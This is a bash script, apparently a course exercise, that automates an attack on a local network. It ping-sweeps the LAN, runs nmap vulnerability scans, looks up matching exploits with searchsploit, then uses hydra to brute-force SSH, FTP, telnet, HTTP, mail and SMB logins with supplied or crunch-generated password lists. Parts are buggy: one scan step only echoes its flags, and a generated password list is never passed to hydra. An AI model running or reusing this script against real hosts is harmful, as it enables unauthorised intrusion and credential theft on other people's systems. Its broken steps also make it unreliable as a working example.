#!/bin/bash

function Install(){
echo "[*] Updating System"
sudo apt-get update
echo "[*] Installing nmap"
sudo apt-get install nmap
echo "[*] Installing ipcalc"
sudo apt-get install ipcalc
echo "[*] Installing sponge"
sudo apt-get install moreutils
echo "[*] Installing hydra"
sudo apt-get install hydra
	
}
#Install

function Q1(){
cd ~/Desktop
network=$(ipcalc -n $(hostname -I) | grep -i network | awk '{print $2}')
echo $network " is the LAN Range"
echo "Commencing Ping Sweep:"
subnet=$(ip route | grep default | awk '{print $3}' | cut -d '.' -f 1-3)
active_devices=()
for ip in {1..254}; do
    echo "Pinging $subnet.$ip"
    ping -c 1 -W 1 $subnet.$ip > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        active_devices+=("$subnet.$ip")
        echo -sV -T4 $subnet.$ip -oX $subnet.$ip
    fi
done
for device in "${active_devices[@]}"
do
    echo "Scanning $device for vulnerabilities..."
    result=$(nmap -sV -sC --script vuln -p- "$device" -oN $device-vuln)
    sploit=$(searchsploit --nmap $device > $device-sploit)
    if [[ "$result" == *"Host is up"* ]]; then
        echo "$result"
        searchsploit --nmap $device 
    else
        echo "No vulnerabilities found on $device."
    fi
done

}
Q1

function Q2(){
cd ~/Desktop
read -p "Enter the path to the user list file: " user_file

echo "Do you want to use an existing password list or create a new one? (e/c)"
read choice

if [[ $choice == "e" ]]; then
 read -p "Enter the path to the password list file: " password_file
else
  echo "Enter minimum length string"
  read min
  echo "Enter maximum length string"
  read max
  echo "Enter character set for string"
  read charset
  crunch $min $max $charset -o passwordlist.txt
  echo "The password list was created at Desktop and was named passwordlist.txt"
fi


for device in "${active_devices[@]}"; do
nmap_output=$(nmap -p- -sV -oG - $device)

open_ports=$(echo "$nmap_output" | grep "/open/" | cut -d' ' -f4 | tr '\n' ',' | sed 's/,$//')

	for port in $(echo "$open_ports" | tr ',' ' '); do
   
		service=$(echo "$nmap_output" | grep " $port/" | cut -d' ' -f3)

		if [[ "$service" == "ssh" || "$service" == "ftp" || "$service" == "telnet" || "$service" == "http" || "$service" == "pop3" || "$service" == "imap" || "$service" == "smtp" || "$service" == "smb" ]]; then
			echo "Running hydra on $service service on port $port"
			hydra -L $user_file -P $password_file $service://$device:$port
		fi   
	done
done
}
Q2
